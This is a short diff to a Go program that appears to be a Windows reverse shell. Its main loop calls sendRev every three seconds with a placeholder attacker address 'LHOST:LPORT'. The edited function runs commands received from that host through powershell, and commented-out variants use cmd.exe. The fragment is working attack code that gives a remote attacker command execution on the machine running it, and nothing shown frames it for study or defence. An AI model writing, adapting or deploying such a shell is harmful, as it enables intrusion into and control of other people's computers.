@@ -17,7 +17,7 @@ import (
 func main() {
 	for {
 		time.Sleep(3 * time.Second)
-		sendRev(":")
+		sendRev("LHOST:LPORT")
 	}
 }
 
@@ -43,7 +43,8 @@ func sendRev(host string) {
 				return
 			}
 			// cmd = exec.Command("powershell.exe", "-c", order)
-			cmd = exec.Command("powershell.exe", order)
+			cmd = exec.Command("powershell", order)
+			//cmd = exec.Command("powershell.exe", order)
 			// cmd = exec.Command("cmd.exe", "/C", order)
 			// Below is not tested not sure if it works at all, removing this block \/ and adding the /C or -c respectivly gives basic funcionality
 			cmd.SysProcAttr = &syscall.SysProcAttr{
